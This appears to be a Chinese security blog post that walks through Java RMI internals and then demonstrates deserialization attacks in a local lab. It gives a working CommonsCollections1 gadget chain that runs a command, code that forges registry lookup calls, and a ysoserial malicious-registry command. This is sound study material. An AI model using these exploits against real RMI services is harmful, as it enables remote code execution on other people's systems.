+++
title = "Java RMI"
publishDate = 2021-03-08T00:00:00+08:00
tags = ["java"]
draft = false
+++

<!--more-->


## RMI 101 {#rmi-101}

RMI(Remote Method Invocation)即远程方法调用，是一种分布式对象通信技术，它使客户机中的程序可以像调用本地对象一样调用远程服务机的对象方法，而不需要关心网络通信的细节。

Java RMI 的远程通信过程中分为 client 和 server，而在两端的程序中，负责处理通信细节的对象分别称为 stub 和 skeleton。也就是说，程序调用一个远程对象的方法时，实际是由 stub 对象获取相关信息并向 skeleton 发送请求，skeleton 对象获取到结果后再返回给 stub 对象，最后返回到我们的代码中。

此外，并不是 JVM 中的所有对象都能被远程调用的，一个能被远程调用的对象需要实现一个继承了 Remote 接口的接口，并且在 Registry(注册中心)注册服务。Client 端在
Registry 查询远程对象并获取 stub 后，才能直接和 Server 端进行通信。

{{< figure src="/ox-hugo/rmi.png" >}}


## 代码分析 {#代码分析}


### 示例代码 {#示例代码}

下面通过简单的示例代码，来实现 RMI 远程方法调用，使用的版本是 `jdk1.7.0_02`

首先需要定义一个可以被远程调用的类，它要继承 Remote 接口。Remote 接口是一个空接口，和 Serializable 接口一样起到标记的作用，说明实现它的类可以被远程调用，其中的方法需要抛出 RemoteException 异常。

<details>
<summary>
interface User extends Remote
</summary>
<p class="details">

```java
public interface User extends Remote {
    void register(String uname) throws RemoteException;
    boolean login(String pwd) throws RemoteException;
    String getName() throws RemoteException;
}
```
</p>
</details>

<details>
<summary>
class UserImpl
</summary>
<p class="details">

```java
// java.rmi.server.UnicastRemoteObject的构造函数将生成stub和skeleton
public class UserImpl extends UnicastRemoteObject implements User {
    String name;

    // 必须有一个显式的构造函数，并且要抛出RemoteException异常
    public UserImpl() throws RemoteException {};

    @Override
    public void register(String uname) throws RemoteException {
        this.name = uname;
        System.out.println("Register called: username is " + uname);
    }

    @Override
    public boolean login(String pwd) throws RemoteException {
        System.out.println("Login succeed, password is " + pwd);
        return true;
    }

    @Override
    public String getName() throws RemoteException {
        return this.name;
    }
}
```
</p>
</details>

接着是 Server 端的实现类，在此创建一个注册表(Registry)并绑定远程对象。

<details>
<summary>
class UserServer
</summary>
<p class="details">

```java
public class UserServer {
    public static void main(String[] args) throws Exception{
        // 默认端口是tcp 1099
        Registry registry = LocateRegistry.createRegistry(3333);
        registry.bind("User", new UserImpl());
        System.out.println("RMI server is ready.");
    }
}
```
</p>
</details>

实际上 Registry 和 Server 是不同的实体，你可以在不同的类(文件)中创建，在低版本的 JDK
中甚至可以放在不同的服务器上，但高版本的 JDK 会进行检测，如果不在同一台服务器就无法注册成功。

最后是 Client 端的实现类，它需要先获取注册表的引用，再通过注册表获取远程对象。由于要调用远程对象的方法，所以 Client 端也需要有该对象的接口定义。

<details>
<summary>
class UserClient
</summary>
<p class="details">

```java
public class UserClient {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.getRegistry(3333);
        User userClient = (User) registry.lookup("User");
        userClient.register("zrquan");
        userClient.login("123");
        System.out.println("Username is " + userClient.getName());
    }
}
```
</p>
</details>


### Register {#register}

获取注册中心有两种方式——一种是 `LocateRegistry.createRegistry()` ，在创建时从本地获取；另一种是 `LocateRegistry.getRegistry()` ，可以远程获取注册中心。在上述代码中，
server 端使用的是第一种方式，所以我们先跟进 createRegistry 方法。

方法实际返回的是一个 RegistryImpl 对象，初始化该对象时执行其私有方法 `setup()`

{{< figure src="/ox-hugo/2021-02-08_20-32-23_screenshot.png" >}}

在上图的 LiveRef 对象中包含 IP、端口等信息，并封装进 UnicastServerRef 对象，然后执行
UnicastServerRef 的 exportObject 方法，生成 stub 和 skel 对象。

{{< figure src="/ox-hugo/2021-02-08_21-08-18_screenshot.png" >}}

对照 UnicastServerRef 对象的成员变量和调用栈，可以看到经过几个 exportObject 方法之后执行到 TCPTransport 的 listen 方法中。

{{< figure src="/ox-hugo/2021-02-08_20-47-36_screenshot.png" >}}

{{< figure src="/ox-hugo/2021-02-08_21-12-22_screenshot.png" >}}

上图的 225 行调用 `TCPEndpoint.newServerSocket()` 后开启端口监听，227 行调用 start
启动线程，执行 `TCPTransport$AcceptLoop` 的 run 方法。

{{< figure src="/ox-hugo/2021-02-08_22-27-19_screenshot.png" >}}

执行到 `ServerSocket.accept()` 后程序阻塞，等待 server 端或 client 端的请求。

接下来分析一下 `LocateRegistry.getRegistry()` ，它有几个重载方法，具体的实现在以下方法中：

```java
public static Registry getRegistry(String host, int port, RMIClientSocketFactory csf) throws RemoteException
{
    Registry registry = null;

    if (port <= 0) port = Registry.REGISTRY_PORT;

    if (host == null || host.length() == 0) {
        try {
            host = java.net.InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            host = "";
        }
    }

    LiveRef liveRef =
        new LiveRef(new ObjID(ObjID.REGISTRY_ID),
                    new TCPEndpoint(host, port, csf, null),
                    false);
    RemoteRef ref = (csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef);

    return (Registry) Util.createProxy(RegistryImpl.class, ref, false);
}
```

如果没有提供 IP 和端口，默认使用本机地址和 1099 端口，然后将它们封装到 LiveRef 对象中，和 createRegistry 时类似。不过后面将这个对象放入 UnicastRef 而不是 UnicastServerRef。

进入 createProxy 方法，再到 createStub 方法：

{{< figure src="/ox-hugo/2021-02-25_22-27-31_screenshot.png" >}}

通过反射得到 RegistryImpl\_Stub 对象，并将远程通信需要的 IP 和端口信息保存到 ref 属性中。

{{< figure src="/ox-hugo/2021-02-25_22-30-17_screenshot.png" >}}


### Server {#server}

创建注册中心后，server 端通过 bind 方法注册远程对象。

```java
registry.bind("User", new UserImpl());
```

然而此时 registry 线程并没有收到 socket 请求，也没有触发反序列化过程🤔

前面提到通过 createRegistry 获取到的是 RegistryImpl 对象，看一下它的 bind 方法：

{{< figure src="/ox-hugo/2021-02-24_18-04-42_screenshot.png" >}}

由此可见 RegistryImpl 对象是对本地的注册中心进行操作，自然不涉及 socket 和序列化，只需要将注册对象添加到哈希表(this.bindings)中即可。

改为使用 getRegistry 获取注册中心，此时返回的是 RegistryImpl\_Stub 对象，它的 bind 方法如下：

```java
public void bind(String var1, Remote var2) throws AccessException, AlreadyBoundException, RemoteException {
    try {
        RemoteCall var3 = super.ref.newCall(this, operations, 0, 4905912898345647071L);

        try {
            ObjectOutput var4 = var3.getOutputStream();
            var4.writeObject(var1);
            var4.writeObject(var2);
        } catch (IOException var5) {
            throw new MarshalException("error marshalling arguments", var5);
        }

        super.ref.invoke(var3);
        super.ref.done(var3);
    } catch (RuntimeException var6) {
        throw var6;
    } catch (RemoteException var7) {
        throw var7;
    } catch (AlreadyBoundException var8) {
        throw var8;
    } catch (Exception var9) {
        throw new UnexpectedException("undeclared checked exception", var9);
    }
}
```

newCall 方法的第二个参数 operations 保存着一个列表，对应着 registry 的各种操作：

{{< figure src="/ox-hugo/2021-02-25_17-14-18_screenshot.png" >}}

可以看到 bind 对应的下标是 0，而此时第三个参数(opnum)也是 0。

跟进 newCall：

{{< figure src="/ox-hugo/2021-02-25_17-20-13_screenshot.png" >}}

在 193 行和 registry 进行通信，获取 Connection 对象，在创建 StreamRemoteCall 对象时传进参数 0，让 registry 知道要执行的是 bind 操作。

这时候跟进一下 registry 的代码，在拿到 socket 对象后继续执行，并创建一个
ConnectionHandler 线程来处理请求。

{{< figure src="/ox-hugo/2021-02-25_23-59-17_screenshot.png" >}}

从 ConnectionHandler#run 跟进到 TCPTransport#handleMessages，函数栈如下：

{{< figure src="/ox-hugo/2021-02-26_00-06-15_screenshot.png" >}}

在 switch 语句中创建一个 StreamRemoteCall 对象，并传入当前的 TCPConnection 对象：

{{< figure src="/ox-hugo/2021-02-26_00-09-24_screenshot.png" >}}

跟进 TCPTransport#serviceCall，获取 ObjID 和 Target 对象，然后调用
UnicastServerRef#dispatch 方法：

{{< figure src="/ox-hugo/2021-02-26_10-35-52_screenshot.png" >}}

当 `this.skel` 不为 null，就调用 UnicastServerRef#oldDispatch：

{{< figure src="/ox-hugo/2021-02-26_10-40-03_screenshot.png" >}}

接着执行 `this.skel.dispatch()` ，即 RegistryImpl\_Skel#dispatch，该方法包括处理请求的核心逻辑：

{{< figure src="/ox-hugo/2021-02-26_10-55-51_screenshot.png" >}}

switch 语句的参数 var3 就是 server 端传过来的 opnum，对应的操作在之前的截图中。

可以看到 bind 和 rebind 都有反序列化的过程，lookup 和 unbind 也存在反序列化，但由于参数是 String 类型，并不能直接利用。

上图的 var6 是 RegistryImpl 对象，因此最终还是会执行 RegistryImpl#bind 方法。

回到 server 端，即 RegistryImpl\_Stub#bind 方法中，向输出流写入序列化后的远程对象和它的名称。执行 `super.ref.invoke()` 发送请求给 registry，由
RegistryImpl\_Skel#dispatch 处理请求。


### Client {#client}

client 端和 server 端的通信发生在调用远程对象的方法时，在此之前需要通过
RegistryImpl\_Stub#lookup 从注册中心获取封装好的代理对象。

{{< figure src="/ox-hugo/2021-02-26_13-22-26_screenshot.png" >}}

调用远程对象的任意方法时，都会先调用 RemoteObjectInvocationHandler#invoke：

{{< figure src="/ox-hugo/2021-02-26_13-59-07_screenshot.png" >}}

上图判断调用的方法是不是所有对象共有的，如果不是就执行 invokeRemoteMethod。

接着调用 LiveRef#invoke 方法(由 lookup 获取)，把 proxy、method、args 以及 method 的 hash
传过去：

{{< figure src="/ox-hugo/2021-02-26_14-11-56_screenshot.png" >}}

跟进 LiveRef#invoke：

{{< figure src="/ox-hugo/2021-02-26_14-20-24_screenshot.png" >}}

获取到 Connection 对象后，调用 marshaValue 将远程方法的参数序列化写入到连接中：

{{< figure src="/ox-hugo/2021-02-26_14-27-26_screenshot.png" >}}

接着将输出流的数据发送到 server 端，获取响应后调用 unmarsharValue 进行反序列化：

{{< figure src="/ox-hugo/2021-02-26_14-32-21_screenshot.png" >}}

{{< figure src="/ox-hugo/2021-02-26_14-33-37_screenshot.png" >}}

在 server 端负责处理请求的方法是 UnicastServerRef#dispatch，调用 unmarshaValue 对参数进行处理：

{{< figure src="/ox-hugo/2021-02-26_14-46-47_screenshot.png" >}}

如果参数是一个对象，在 unmarshaValue 中会将其反序列化，然后通过反射调用远程方法。

{{< figure src="/ox-hugo/2021-02-26_14-53-07_screenshot.png" >}}

{{< figure src="/ox-hugo/2021-02-26_14-54-21_screenshot.png" >}}

后面的流程就不继续跟进了，我们已经知道 client 端和 server 端通信时调用了
unmarshaValue 方法进行反序列化相关操作，这也正是攻击的入口点。


## 攻击途径 {#攻击途径}

前文大致分析了一下 Java RMI 中各个角色是怎么进行交互的，以及代码执行过程中一些涉及到反序列化的点。下面就针对这些反序列化的点进行模拟攻击，以此了解针对 Java RMI 服务都有哪些常见的攻击途径。

攻击时所使用的 POP 链是 CommonsCollections1，可以在[这篇文章]({{< relref "ysoserial-cc1" >}})了解一下。先写一个 Poc
类方便生成恶意对象：

```java
public class Poc {
    Remote getObject() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] {String.class},
                        new Object[] {"calc.exe"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "zrquan");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
        // 用Remote代理对象封装evalObject
        return Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject));
    }
}
```

由于 RMI 很多方法的参数都是 Remote 类型，所以要用 Remote 类型的代理对象封装 evalObject，当代理对象反序列化时，evalObject 也会进行反序列化。


### Server/Client --> Registry {#server-client-registry}

先看看 registry 中最容易利用的两个方法 bind 和 rebind，它们会对接收到的序列化对象进行反序列化：

{{< figure src="/ox-hugo/2021-03-04_13-47-15_screenshot.png" >}}

通过 Poc#getObject 生成恶意对象，调用 bind 方法(rebind 类同)传给 registry。

```java
Registry registry = LocateRegistry.getRegistry(3333);
registry.bind("User", (new Poc()).getObject());
```

RegistryImpl\_Skel#dispatch 处理请求：

{{< figure src="/ox-hugo/2021-03-05_15-32-01_screenshot.png" >}}

反序列化 AnnotationInvocationHandler 对象，调用 `var5.setValue()` 方法：

{{< figure src="/ox-hugo/2021-03-05_15-42-18_screenshot.png" >}}

调用 ChainedTransformer#transform，触发命令执行：

{{< figure src="/ox-hugo/2021-03-05_15-44-54_screenshot.png" >}}

{{< figure src="/ox-hugo/2021-03-05_15-49-19_screenshot.png" >}}

接下来尝试利用 lookup 方法(unbind 类同)，它接收的是 String 参数，不能直接传递恶意对象。

但前面的分析过程我们已经知道，RegistryImpl\_Skel#dispatch 是通过一个数字来判断执行什么操作的，所以它并不能判断我们传过去的是不是 String 对象，那我们仿照 lookup 方法的逻辑来发送恶意对象不就好了。

看一下 RegistryImpl\_Stub#lookup 方法的关键操作：

{{< figure src="/ox-hugo/2021-03-05_16-07-33_screenshot.png" >}}

通过以下代码伪造 lookup 请求：

```java
Registry registry = LocateRegistry.getRegistry(3333);
// 获取super.ref
Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
fields_0[0].setAccessible(true);
UnicastRef ref = (UnicastRef) fields_0[0].get(registry);

// 获取operations
Field[] fields_1 = registry.getClass().getDeclaredFields();
fields_1[0].setAccessible(true);
Operation[] operations = (Operation[]) fields_1[0].get(registry);

// 模仿lookup方法
RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
ObjectOutput var3 = var2.getOutputStream();
var3.writeObject(Poc.getObject());
ref.invoke(var2);
```

{{< figure src="/ox-hugo/2021-03-05_16-19-31_screenshot.png" >}}

此外，还可以通过 RASP 技术 hook 请求代码，修改发送的数据。


### Registry --> Server/Client {#registry-server-client}

远程获取注册中心后，是通过 RegistryImpl\_Stub 对象来进行操作的。我们前面分析过
RegistryImpl\_Stub#bind 方法，双方会相互传输序列化的数据，自然伴随着反序列化的过程，那么注册中心也就可以返回恶意数据完成对 client 或 server 端的攻击。

可以用 ysoserial 搭建恶意的 registry，我用高版本 jdk 时会报错，用 jdk8 就可以运行。

```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12321 CommonsCollections1 'calc.exe'
```

在恶意 registry 执行 list 方法后，客户端的调用栈：

{{< figure src="/ox-hugo/2021-03-08_14-47-54_screenshot.png" >}}

看到 StreamRemoteCall#executeCall 方法中有反序列化操作，跟进一下：

{{< figure src="/ox-hugo/2021-03-08_14-50-32_screenshot.png" >}}

客户端在 switch 语句中对输入流进行了反序列化，在这个过程会被恶意 registry 攻击。其实在执行 bind、unbind 这些 `void` 方法时，正常情况是走到 `case 1` 里直接返回的，不过 var1
也是从输入流读取的，所以恶意 registry 完全可以控制 switch 的走向。

{{< figure src="/ox-hugo/2021-03-08_14-55-47_screenshot.png" >}}

其余的 lookup、bind、rebind、unbind 方法同样可以被恶意 registry 攻击。


### Server --> Client {#server-client}

当远程方法的返回值是对象时，server 端可以通过返回一个恶意对象对 client 端进行反序列化攻击。

现在给 User 接口添加一个 attackClient 方法，该方法返回 Object 对象：

<details>
<summary>
public Object attackClient() throws RemoteException
</summary>
<p class="details">

```java
try {
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                    new Class[] {String.class, Class[].class},
                    new Object[] {"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                    new Class[] {Object.class, Object[].class},
                    new Object[] {null, new Object[0] }),
            new InvokerTransformer("exec",
                    new Class[] {String.class},
                    new Object[] {"calc.exe"})
    };
    Transformer transformerChain = new ChainedTransformer(transformers);
    Map innerMap = new HashMap();
    innerMap.put("value", "zrquan");
    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
    Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
    cons.setAccessible(true);
    InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
    return (Object) evalObject;
} catch (InstantiationException e) {
    e.printStackTrace();
} catch (InvocationTargetException e) {
    e.printStackTrace();
} catch (NoSuchMethodException e) {
    e.printStackTrace();
} catch (IllegalAccessException e) {
    e.printStackTrace();
} catch (ClassNotFoundException e) {
    e.printStackTrace();
}
return null;
```
</p>
</details>

注册好远程对象后，在 client 端调用 attackClient 方法时调用栈如下：

{{< figure src="/ox-hugo/2021-03-08_22-28-16_screenshot.png" >}}

在 UnicastRef#unmarshalValue 方法中触发反序列化，成功在 client 端执行命令。


### Client --> Server {#client-server}

相应的，当远程方法的参数是对象时，client 端也可以通过输入一个恶意对象对 server
端进行反序列化攻击。

再给 User 接口添加一个 attackServer 方法，它的参数是一个 Object 对象：

```java
public void attackServer(Object obj) throws RemoteException {
    System.out.println(obj);
}
```

为了方便起见(懒)，直接用刚刚的 attackClient 来生成恶意对象。client 端的代码如下：

```java
public class UserClient {
    public static void main(String[] args) throws Exception{
        Registry reigstry = LocateRegistry.getRegistry(3333);
        Object evilObj = (new UserImpl()).attackClient();
        User user = (User) reigstry.lookup("User");
        user.attackServer(evilObj);
    }
}
```

代码执行后，看一下 server 线程的调用栈：

{{< figure src="/ox-hugo/2021-03-08_22-41-39_screenshot.png" >}}

UnicastServerRef#dispatch 负责处理 client 端的请求，同样是在
UnicastRef#unmarshalValue 方法中触发反序列化。

{{< figure src="/ox-hugo/2021-03-08_22-45-19_screenshot.png" >}}


## 最后 {#最后}

本文介绍了 Java RMI 中的三个角色——注册中心、服务端和客户端。简单地分析了它们在进行交互时代码的执行过程，弄清楚反序列化会在什么时候发生，从而学习如何去进行攻击。

但实际上，在 JDK9 中引入了 JEP 290 后，对 RMI 的反序列化漏洞利用不再像本文那么简单直接。关于 JEP 290 的知识和绕过会在之后的文章中分享。
